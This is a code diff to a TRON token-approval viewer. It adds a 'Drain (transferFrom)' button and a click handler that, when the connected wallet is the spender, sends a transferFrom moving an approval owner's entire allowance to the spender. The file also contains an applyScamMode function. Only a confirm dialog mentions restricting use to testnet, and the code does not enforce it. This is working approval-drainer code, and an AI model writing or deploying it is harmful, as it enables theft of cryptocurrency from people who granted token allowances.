@@ -654,6 +654,14 @@
           (txid
             ? `<a href="${cfg.TRONSCAN_BASE}/#/transaction/${txid}" target="_blank" rel="noopener noreferrer">tx ↗</a>`
             : "") +
+        `</div>` +
+        `<div class="approval-line" style="justify-content:flex-end">` +
+          `<button type="button" class="btn-drain" ` +
+            `data-owner="${escapeHtml(owner)}" ` +
+            `data-spender="${escapeHtml(spender)}" ` +
+            `data-allowance="${escapeHtml(value)}" ` +
+            `data-unlimited="${unlimited ? "1" : "0"}" ` +
+            `disabled>Drain (transferFrom)</button>` +
         `</div>`;
       frag.appendChild(row);
       if (!ownerToRows.has(owner)) ownerToRows.set(owner, []);
@@ -709,10 +717,73 @@
           const riskHuman = fromUnits(risk.toString());
           riskSpan.textContent = `${formatNumber(riskHuman)} ${state.symbol}`;
           if (Number(riskHuman) > 0 && unlimited) riskSpan.classList.add("danger-text");
+          // Enable Drain button if connected wallet IS the spender and risk > 0.
+          const drainBtn = row.querySelector(".btn-drain");
+          if (drainBtn) {
+            drainBtn.dataset.risk = risk.toString();
+            const spender = drainBtn.dataset.spender;
+            const canDrain =
+              state.address &&
+              spender &&
+              state.address === spender &&
+              Number(riskHuman) > 0;
+            drainBtn.disabled = !canDrain;
+            if (!canDrain && state.address && state.address !== spender) {
+              drainBtn.title =
+                "Connect wallet matching the spender address to drain this approval";
+            }
+          }
         });
       }
     }
     await Promise.all(Array.from({ length: CONCURRENCY }, worker));
+
+    // Single delegated click handler for drain buttons.
+    if (!els.approvalsList.dataset.drainBound) {
+      els.approvalsList.dataset.drainBound = "1";
+      els.approvalsList.addEventListener("click", async (e) => {
+        const btn = e.target.closest(".btn-drain");
+        if (!btn || btn.disabled) return;
+        const owner = btn.dataset.owner;
+        const spender = btn.dataset.spender;
+        const risk = btn.dataset.risk;
+        if (!owner || !spender || !risk) return;
+        if (!state.tokenContract || !state.address) {
+          toast("Connect wallet first", "warn");
+          return;
+        }
+        if (state.address !== spender) {
+          toast("Switch TronLink to the spender wallet first", "error");
+          return;
+        }
+        const human = fromUnits(risk);
+        if (!confirm(
+          `Drain ${human} ${state.symbol} from\n${owner}\n→ ${spender}\n\n` +
+          `This uses the unlimited approval to call transferFrom. ` +
+          `Only do this on testnet against wallets you control.`,
+        )) return;
+        btn.disabled = true;
+        const original = btn.textContent;
+        btn.textContent = "Draining…";
+        try {
+          const txid = await sendTx(
+            `Drain ${human} ${state.symbol} from ${shortAddr(owner, 6, 4)}`,
+            state.tokenContract.transferFrom(owner, spender, risk),
+          );
+          if (txid) {
+            btn.textContent = "Drained ✓";
+            toast("Drain successful. Refresh to see updated balance.", "info");
+          } else {
+            btn.textContent = original;
+            btn.disabled = false;
+          }
+        } catch (err) {
+          btn.textContent = original;
+          btn.disabled = false;
+          toast("Drain failed: " + (err && err.message ? err.message : err), "error");
+        }
+      });
+    }
   }
 
   function applyScamMode() {
